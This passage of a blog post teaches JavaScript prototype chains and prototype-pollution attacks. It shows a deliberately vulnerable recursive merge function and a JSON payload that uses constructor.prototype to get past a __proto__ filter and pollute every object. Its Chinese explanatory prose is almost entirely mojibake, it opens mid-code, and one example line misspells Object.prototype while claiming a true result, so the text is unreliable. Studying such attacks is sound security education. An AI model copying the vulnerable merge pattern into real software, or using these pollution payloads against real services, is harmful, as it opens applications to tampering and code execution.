function_">person</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(web.<span class="title function_">test</span>());</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(web.<span class="property">a</span>)</span><br><span class="line"></span><br><span class="line">é€šè¿‡objectåˆ›å»º</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a=<span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">a.<span class="property">c</span>=<span class="number">3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">c</span>)</span><br></pre></td></tr></table></figure><h2 id="åŸå‹é“¾"><a href="#åŸå‹é“¾" class="headerlink" title="åŸå‹é“¾"></a>åŸå‹é“¾</h2><h4 id="åŸå‹"><a href="#åŸå‹" class="headerlink" title="åŸå‹"></a>åŸå‹</h4><p>javascripté‡Œçš„æ¯ä¸€ä¸ªå¯¹è±¡ï¼ˆobjectï¼‰ï¼Œéƒ½æœ‰ä¸€äº›å†…ç½®å±æ€§ï¼ˆpropertyï¼‰ï¼ŒåŸå‹æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œæ‰€ä»¥ä»–ä¹Ÿæœ‰è‡ªå·±çš„åŸå‹ï¼Œè¿™å°±å½¢æˆäº†ä¸€ä¸ªåŸå‹é“¾ï¼Œå½“ä¸€ä¸ªåŸå‹çš„åŸå‹æ˜¯nullï¼ŒåŸå‹é“¾å°±ä¼šåœ¨è¿™é‡Œç»“æŸã€‚</p><p>è¿™ä¸ªâ€åŸå‹â€œå±æ€§æ˜¯ä¸€ä¸ªæŒ‡å‘å¯¹è±¡åŸå‹çš„ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå±æ€§æ²¡æœ‰ç»Ÿä¸€çš„ç§°å‘¼ï¼Œä½†æ˜¯æµè§ˆå™¨éƒ½æ”¯æŒä½¿ç”¨ â€__proto__â€œæ¥æŸ¥çœ‹åŸå‹ã€‚è®¿é—®ä¸€ä¸ªå¯¹è±¡åŸå‹çš„æ ‡å‡†æ–¹æ³•æ˜¯ä½¿ç”¨ â€Object.getPrototypeOf()â€œã€‚</p><h5 id="Prototype-åŸå‹-åŸå‹å¯¹è±¡"><a href="#Prototype-åŸå‹-åŸå‹å¯¹è±¡" class="headerlink" title="Prototype åŸå‹ | åŸå‹å¯¹è±¡"></a>Prototype åŸå‹ | åŸå‹å¯¹è±¡</h5><p>1ã€Prototypeå®ƒæ˜¯ã€å‡½æ•°çš„ã€‘ä¸€ä¸ªå±æ€§</p><p>2ã€Protopypeæ˜¯ä¸ªå¯¹è±¡</p><p>3ã€å½“æˆ‘ä»¬åˆ›å»ºå‡½æ•°çš„æ—¶å€™ä¼šé»˜è®¤æ·»åŠ Prototypeè¿™ä¸ªå±æ€§</p><h5 id="proto-éšå¼åŸå‹"><a href="#proto-éšå¼åŸå‹" class="headerlink" title="__proto__ éšå¼åŸå‹"></a>__proto__ éšå¼åŸå‹</h5><p>1ã€ã€å¯¹è±¡ã€‘çš„å±æ€§</p><p>2ã€æŒ‡å‘æ„é€ å‡½æ•°çš„Protopype</p><p>3ã€obj.<em>_proto</em>_ &#x3D;&#x3D;&#x3D; test.prototype   ç­‰äºtrue</p><h5 id="åŸå‹é“¾é¡¶å±‚"><a href="#åŸå‹é“¾é¡¶å±‚" class="headerlink" title="åŸå‹é“¾é¡¶å±‚"></a>åŸå‹é“¾é¡¶å±‚</h5><p>Object.prototype.__proto__     ç­‰äºnull</p><h5 id="åŸå‹é“¾æŸ¥æ‰¾"><a href="#åŸå‹é“¾æŸ¥æ‰¾" class="headerlink" title="åŸå‹é“¾æŸ¥æ‰¾"></a>åŸå‹é“¾æŸ¥æ‰¾</h5><p>instanceofè¿ç®—ç¬¦å¯ä»¥ç”¨æ¥åˆ¤æ–­æŸä¸ªæ„é€ å‡½æ•°çš„prototypeå±æ€§æ˜¯å¦å­˜åœ¨å¦å¤–ä¸€ä¸ªè¦æ£€æµ‹å¯¹è±¡çš„åŸå‹é“¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function My()&#123;&#125;</span><br><span class="line">function You()&#123;&#125;</span><br><span class="line"></span><br><span class="line">var myOne=new My();</span><br><span class="line">console.info(myOne instanceof My)  //true</span><br><span class="line">console.info(myOne instanceof You)  //false</span><br></pre></td></tr></table></figure><p><strong>JavaScriptçš„è¿™ä¸ªæŸ¥æ‰¾çš„æœºåˆ¶ï¼Œè¢«è¿ç”¨åœ¨é¢å‘å¯¹è±¡çš„ç»§æ‰¿ä¸­ï¼Œè¢«ç§°ä½œprototypeç»§æ‰¿é“¾ã€‚</strong></p><h5 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span> (name) &#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">name</span>=name</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">a</span>=<span class="number">1</span></span><br><span class="line">&#125; <span class="comment">//è¿™åªæ˜¯ä¸€ä¸ªæ™®é€šå‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = <span class="keyword">new</span> <span class="title function_">test</span>(<span class="string">&#x27;xiaoming&#x27;</span>)  <span class="comment">//ä½¿ç”¨newç”Ÿæˆobjå¯¹è±¡äº†ï¼Œtestæ­¤æ—¶å°±æ˜¯æ„é€ å‡½æ•°ï¼Œä»»ä½•å‡½æ•°éƒ½å¯ä»¥æ˜¯æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">a</span>) <span class="comment">//è¿”å› 1</span></span><br><span class="line">test.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">b</span>=<span class="number">2</span>  <span class="comment">//ç»™å‡½æ•°åŸå‹æ·»åŠ bå±æ€§ï¼Œå€¼ä¸º2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">b</span>) <span class="comment">//è¿”å›2</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">c</span>=<span class="number">3</span>  <span class="comment">//ç»™é¡¶å±‚æ·»åŠ cå±æ€§ï¼Œå€¼ä¸º3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">c</span>) <span class="comment">//è¿”å›3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">__proto__</span> === test.<span class="property"><span class="keyword">prototype</span></span>)  <span class="comment">//å¯¹è±¡çš„__proto__ç­‰äºå‡½æ•°çš„åŸå‹</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(test.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> === <span class="title class_">Object</span>.<span class="property">prototypre</span>) <span class="comment">//å‡½æ•°åŸå‹å¯¹è±¡çš„__proto__å±æ€§å°±ç­‰äºObjectå‡½æ•°çš„åŸå‹  è¿”å›ture</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span>) <span class="comment">//Objectå‡½æ•°çš„åŸå‹å¯¹è±¡çš„__proto__å±æ€§ç­‰äºNULLï¼Œå› ä¸ºObjectæ˜¯é¡¶å±‚</span></span><br></pre></td></tr></table></figure><h5 id="ç»“æ„å‰–æ"><a href="#ç»“æ„å‰–æ" class="headerlink" title="ç»“æ„å‰–æ"></a>ç»“æ„å‰–æ</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">obj &#123;</span><br><span class="line">    <span class="attr">a</span>:<span class="number">1</span>,                                  <span class="comment">//aå±æ€§ï¼Œå€¼ä¸º1</span></span><br><span class="line"><span class="attr">__proto__</span>:test.<span class="property"><span class="keyword">prototype</span></span> =&#123;           <span class="comment">//obj.__proto__æŒ‡å‘test.prototype</span></span><br><span class="line">        <span class="attr">b</span>:<span class="number">2</span>,                              <span class="comment">//å‡½æ•°åŸå‹æ·»åŠ çš„bå±æ€§ï¼Œå€¼ä¸º2</span></span><br><span class="line"><span class="attr">__proto__</span>:<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span> = &#123;  <span class="comment">//test.prototype.__proto__æŒ‡å‘Object.prototypre</span></span><br><span class="line">            <span class="attr">c</span>:<span class="number">3</span>,                          <span class="comment">//é¡¶å±‚æ·»åŠ çš„cå±æ€§ï¼Œå€¼ä¸º3</span></span><br><span class="line"><span class="attr">__proto__</span>:<span class="literal">null</span>              <span class="comment">//Object.prototype.__proto__æŒ‡å‘null   </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="é“¾å­å‰–æ"><a href="#é“¾å­å‰–æ" class="headerlink" title="é“¾å­å‰–æ"></a>é“¾å­å‰–æ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj -&gt; __proto__ -&gt; test.prototype -&gt; __proto__ -&gt; Object.prototype -&gt; __proto__ -&gt; null</span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯objçš„åŸå‹é“¾</p><h4 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a>åŸå‹é“¾æ±¡æŸ“</h4><p>å› ä¸ºåŸå‹é“¾å°±æ˜¯å¥—å¨ƒçš„ï¼Œä¸€çº§æ¥ç€ä¸€çº§ï¼Œå±æ€§æ˜¯ä»ä¸Šé¢å¾€ä¸‹å åŠ çš„ï¼Œä¸‹é¢çš„éƒ½ä¼šç»§æ‰¿ä¸Šé¢çš„å±æ€§ï¼Œå¦‚æœæˆ‘ä»¬åœ¨åŸå‹é“¾çš„ä¸Šçº§æ·»åŠ äº†æ¶æ„å¯¹è±¡ï¼Œé‚£ä¹ˆåŸå‹é“¾å°±ä¼šè¢«æ±¡æŸ“ï¼Œåç»­åˆ›å»ºçš„å¯¹è±¡éƒ½å¯ä»¥ç»§æ‰¿å¹¶è°ƒç”¨æ¶æ„å¯¹è±¡ã€‚</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412132318079.png"></p><p>å¦‚æœæœåŠ¡ç«¯ä½¿ç”¨æŸäº›å¯ä»¥å¤åˆ¶ã€ç»§æ‰¿å˜é‡çš„å‡½æ•°ï¼Œå‡½æ•°çš„å‚æ•°æ˜¯ç”¨æˆ·å¯æ§ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½é€ æˆåŸå‹é“¾æ±¡æŸ“æ”»å‡»ã€‚</p><p>æ­¤æ—¶bçš„ä¸Šçº§åŸå‹açš„å±æ€§å·²ç»è¢«æ±¡æŸ“ï¼Œbç»§æ‰¿aåï¼Œä¹Ÿå¯ä»¥è°ƒç”¨æ¶æ„å¯¹è±¡ã€‚</p><h4 id="åŸå‹é“¾æ±¡æŸ“åˆ©ç”¨"><a href="#åŸå‹é“¾æ±¡æŸ“åˆ©ç”¨" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“åˆ©ç”¨"></a>åŸå‹é“¾æ±¡æŸ“åˆ©ç”¨</h4><p>åœ¨javascriptä¸­ï¼Œfunctionæ˜¯ä¸€ä¸ªç”¨äºå®šä¹‰å‡½æ•°çš„å…³é”®å­—ï¼ŒFunctionæ˜¯ä»£è¡¨æ‰€æœ‰å‡½æ•°çš„å†…ç½®åŸå‹å¯¹è±¡ã€‚</p><h5 id="constructoræ¦‚å¿µ"><a href="#constructoræ¦‚å¿µ" class="headerlink" title="constructoræ¦‚å¿µ"></a>constructoræ¦‚å¿µ</h5><p>Object.prototype.constructorå…¶ä¸­constructoræ˜¯ä¸€ä¸ªå¯¹è±¡çš„æ•°æ®å±æ€§ï¼Œåˆ›å»ºå¯¹è±¡åï¼Œè®¿é—®constructorå±æ€§ï¼Œå¯ä»¥è¿”å›æ„é€ è¯¥å¯¹è±¡çš„æ¥æºã€å°±æ˜¯å‘Šè¯‰ä½ å®ƒæ˜¯ä»å“ªæ¥çš„ã€‘ï¼ˆä¸æ˜¯è¯¥å¯¹è±¡çš„åŸå‹é“¾ä¸Šçº§ï¼Œä¸¤è€…ä¸åŒï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">demoï¼š</span><br><span class="line">var a=1;</span><br><span class="line">a.__proto__</span><br><span class="line">//NumberÂ &#123;0, toExponential: Æ’, toFixed: Æ’, toPrecision: Æ’, toString: Æ’,Â â€¦&#125;</span><br><span class="line">a.__proto__.constructor</span><br><span class="line">//Number() &#123; [native code] &#125;</span><br><span class="line">a.constructor</span><br><span class="line">//Number() &#123; [native code] &#125;</span><br><span class="line">a.constructor === Number</span><br><span class="line">//true</span><br><span class="line">var b=Number(1);</span><br><span class="line">b.constructor === a.constructor</span><br><span class="line">//true</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="constructor-å’Œ-prototype-çš„è§’è‰²"><a href="#constructor-å’Œ-prototype-çš„è§’è‰²" class="headerlink" title="constructor å’Œ prototype çš„è§’è‰²"></a><strong><code>constructor</code> å’Œ <code>prototype</code> çš„è§’è‰²</strong></h5><h5 id="constructor-çš„ä½œç”¨"><a href="#constructor-çš„ä½œç”¨" class="headerlink" title="constructor çš„ä½œç”¨"></a><strong><code>constructor</code> çš„ä½œç”¨</strong></h5><ul><li><p>æ¯ä¸ª JavaScript å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª <code>constructor</code> å±æ€§ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒæŒ‡å‘åˆ›å»ºè¯¥å¯¹è±¡çš„æ„é€ å‡½æ•°ã€‚</p></li><li><p>ä¾‹å¦‚ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">constructor</span> === <span class="title class_">Object</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="prototype-çš„ä½œç”¨"><a href="#prototype-çš„ä½œç”¨" class="headerlink" title="prototype çš„ä½œç”¨"></a><strong><code>prototype</code> çš„ä½œç”¨</strong></h5><ul><li><p>æ„é€ å‡½æ•°çš„ <code>prototype</code> å±æ€§æ˜¯å®ä¾‹å¯¹è±¡çš„é»˜è®¤åŸå‹ï¼ˆå³å®ä¾‹çš„ <code>__proto__</code>ï¼‰ã€‚</p></li><li><p>ä¾‹å¦‚ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">MyClass</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> obj = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">__proto__</span> === <span class="title class_">MyClass</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="ä¸¤è€…çš„å…³ç³»"><a href="#ä¸¤è€…çš„å…³ç³»" class="headerlink" title="ä¸¤è€…çš„å…³ç³»"></a><strong>ä¸¤è€…çš„å…³ç³»</strong></h5><ul><li>ä¿®æ”¹æ„é€ å‡½æ•°çš„ <code>prototype</code> ä¼šå½±å“ç”±è¯¥æ„é€ å‡½æ•°åˆ›å»ºçš„æ‰€æœ‰å¯¹è±¡çš„åŸå‹ã€‚</li><li>é€šè¿‡ <code>constructor.prototype</code> å¯ä»¥é—´æ¥ä¿®æ”¹å¯¹è±¡çš„åŸå‹é“¾ï¼Œç”šè‡³æ˜¯å…¨å±€å¯¹è±¡çš„åŸå‹ã€‚</li></ul><p>æ‰€ä»¥ï¼Œå½“æˆ‘ä»¬çš„__proto__è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨constructor.prototypeç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        if (key == &quot;__proto__&quot;) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        if (key in target &amp;&amp; key in source) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let payload = JSON.parse(&#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;polluted&quot;: &quot;Yes, I am polluted!&quot;&#125;&#125;&#125;&#x27;);</span><br><span class="line"></span><br><span class="line">let user=&#123;&#125;</span><br><span class="line">merge(user, payload);</span><br><span class="line"></span><br><span class="line">// éªŒè¯</span><br><span class="line">console.log(&#123;&#125;.polluted); // &quot;Yes, I am polluted!&quot;</span><br></pre></td></tr></table></figure><h5 id="Functionæ¦‚å¿µ"><a href="#Functionæ¦‚å¿µ" class="headerlink" title="Functionæ¦‚å¿µ"></a>Functionæ¦‚å¿µ</h5><p>æ¯ä¸€ä¸ªjavascriptçš„functionå®é™…ä¸Šéƒ½æ˜¯Functionå¯¹è±¡ï¼ŒFunctionæ˜¯javascriptå†…ç½®çš„å¯¹è±¡ï¼ŒFunctionç”¨ä»¥å®ç°å¾ˆå¤šåŸºæœ¬çš„åŠŸèƒ½ï¼Œå¦‚Numberã€toStringç­‰ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(function () &#123;&#125;).constructor</span><br><span class="line">//Function() &#123; [native code] &#125;</span><br><span class="line">(function () &#123;&#125;).constructor === Function</span><br><span class="line">//true</span><br></pre></td></tr></table></figure><h6 id="Function-constructor"><a href="#Function-constructor" class="headerlink" title="Function() constructor"></a>Function() constructor</h6><p>Function()æ„é€ å™¨å¯ä»¥åˆ›å»ºä¸€ä¸ªFunctionå¯¹è±¡ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨Function()æ„é€ å™¨åŠ¨æ€çš„åˆ›å»ºå‡½æ•°ã€‚ä½†æ˜¯ä¼šå­˜åœ¨åƒeval()çš„å®‰å…¨éšæ‚£å’Œä¸€äº›æ€§èƒ½é—®é¢˜ã€‚</p><p>eval()å’ŒFunctionåŒºåˆ«:</p><p>1ã€eval()å¯ä»¥è®¿é—®æœ¬åœ°çš„å˜é‡ã€å…¨å±€å˜é‡</p><p>2ã€Funtion()åˆ›å»ºå‡½æ•°æ—¶åªèƒ½æ‰§è¡Œå…¨å±€å˜é‡</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412132318206.png" alt="image-20241116203304251"></p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412132318959.png" alt="image-20241116204011412"></p><h3 id="JSON-parse"><a href="#JSON-parse" class="headerlink" title="JSON.parse"></a>JSON.parse</h3><p>çœ‹ä¸€ä¸ªç»å…¸çš„é€’å½’åˆå¹¶å‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target,source</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line"><span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line"><span class="title function_">merge</span>(target[key],source[key])</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">target[key]=source[key]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> o1=&#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2=&#123;<span class="attr">a</span>: <span class="number">1</span>,<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">b</span>:<span class="number">2</span>&#125;&#125;</span><br><span class="line"><span class="title function_">merge</span>(o1,o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3=&#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br><span class="line">[<span class="title class_">Running</span>] node <span class="string">&quot;payload.js&quot;</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">[<span class="title class_">Done</span>] exited <span class="keyword">with</span> code=<span class="number">0</span> <span class="keyword">in</span> <span class="number">0.199</span> seconds</span><br></pre></td></tr></table></figure><p>æ ¸å¿ƒæ€æƒ³æ˜¯ç†è§£ <code>__proto__</code> åœ¨å¯¹è±¡å®šä¹‰ä¸­çš„è¡Œä¸ºï¼Œä»¥åŠå®ƒåœ¨åˆå¹¶æ“ä½œä¸­å¦‚ä½•å½±å“ç›®æ ‡å¯¹è±¡ã€‚ä»¥ä¸‹æ˜¯é€æ­¥è§£é‡Šï¼š</p><h4 id="1-proto-çš„è¡Œä¸º"><a href="#1-proto-çš„è¡Œä¸º" class="headerlink" title="1. __proto__ çš„è¡Œä¸º"></a>1. <strong><code>__proto__</code> çš„è¡Œä¸º</strong></h4><p>åœ¨ JavaScript ä¸­ï¼Œ<code>__proto__</code> æ˜¯ä¸€ä¸ªç‰¹æ®Šå±æ€§ï¼Œç”¨äºè®¾ç½®å¯¹è±¡çš„åŸå‹ã€‚å®ƒä¸æ˜¯æ™®é€šçš„é”®ï¼Œè€Œæ˜¯ä¸å¯¹è±¡çš„åŸå‹é“¾ç›¸å…³ã€‚</p><h5 id="å½“-proto-è¢«ç”¨ä½œé”®ï¼š"><a href="#å½“-proto-è¢«ç”¨ä½œé”®ï¼š" class="headerlink" title="å½“ __proto__ è¢«ç”¨ä½œé”®ï¼š"></a>å½“ <code>__proto__</code> è¢«ç”¨ä½œé”®ï¼š</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;;</span><br></pre></td></tr></table></figure><ul><li>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ<code>__proto__</code> è¡¨é¢ä¸Šçœ‹æ˜¯ä¸€ä¸ªæ™®é€šçš„é”®å€¼å¯¹ã€‚</li><li><strong>å®é™…è¡Œä¸º</strong>ï¼š<code>__proto__</code> è¿™ä¸ªé”®ä¼šè¢«ç‰¹æ®Šå¤„ç†ï¼Œå°† <code>&#123;b: 2&#125;</code> ä½œä¸º <code>o2</code> çš„åŸå‹ï¼Œè€Œä¸æ˜¯æ™®é€šçš„å¯¹è±¡å±æ€§ã€‚</li></ul><p>ç›¸å½“äºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">o2.<span class="property">a</span> = <span class="number">1</span>;</span><br><span class="line">o2.<span class="property">__proto__</span> = &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;; <span class="comment">// o2 ç»§æ‰¿äº† &#123;b: 2&#125; ä½œä¸ºå®ƒçš„åŸå‹ã€‚</span></span><br></pre></td></tr></table></figure><p>ç»“æœï¼š</p><ul><li><code>o2.a</code> æ˜¯ o2 è‡ªå·±çš„å±æ€§ã€‚</li><li><code>o2.b</code> ä¸ç›´æ¥å­˜åœ¨äº o2ï¼Œè€Œæ˜¯æ¥è‡ªäºå®ƒçš„åŸå‹ <code>&#123;b: 2&#125;</code>ã€‚</li></ul><p>å¦‚æœç›´æ¥è®¿é—® <code>o2.b</code>ï¼ŒJavaScript ä¼šé€šè¿‡åŸå‹é“¾æŸ¥æ‰¾ï¼Œå› æ­¤ <code>o2.b</code> çš„å€¼æ˜¯ <code>2</code>ã€‚</p><h4 id="2-åˆå¹¶å‡½æ•°çš„è¡Œä¸º"><a href="#2-åˆå¹¶å‡½æ•°çš„è¡Œä¸º" class="headerlink" title="2. åˆå¹¶å‡½æ•°çš„è¡Œä¸º"></a>2. <strong>åˆå¹¶å‡½æ•°çš„è¡Œä¸º</strong></h4><p>æˆ‘ä»¬æ¥çœ‹ <code>merge</code> å‡½æ•°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong><code>for...in</code> å¾ªç¯</strong>ï¼š<br>éå† <code>source</code> çš„æ‰€æœ‰å¯æšä¸¾å±æ€§ï¼ŒåŒ…æ‹¬ç»§æ‰¿çš„å±æ€§ï¼ˆä»åŸå‹é“¾ä¸Šæ¥çš„ï¼‰ã€‚</li><li><strong><code>key in source</code> åˆ¤æ–­</strong>ï¼š ç¡®ä¿ <code>key</code> æ˜¯ <code>source</code> ä¸­çš„ä¸€ä¸ªå±æ€§ï¼ˆåŒ…æ‹¬è‡ªèº«å’ŒåŸå‹é“¾ï¼‰ã€‚</li></ul><h4 id="3-ä¸ºä»€ä¹ˆåªæœ‰-a-è¢«åˆå¹¶ï¼Ÿ"><a href="#3-ä¸ºä»€ä¹ˆåªæœ‰-a-è¢«åˆå¹¶ï¼Ÿ" class="headerlink" title="3. ä¸ºä»€ä¹ˆåªæœ‰ a è¢«åˆå¹¶ï¼Ÿ"></a>3. <strong>ä¸ºä»€ä¹ˆåªæœ‰ <code>a</code> è¢«åˆå¹¶ï¼Ÿ</strong></h4><p>å½“ä½ æ‰§è¡Œï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = 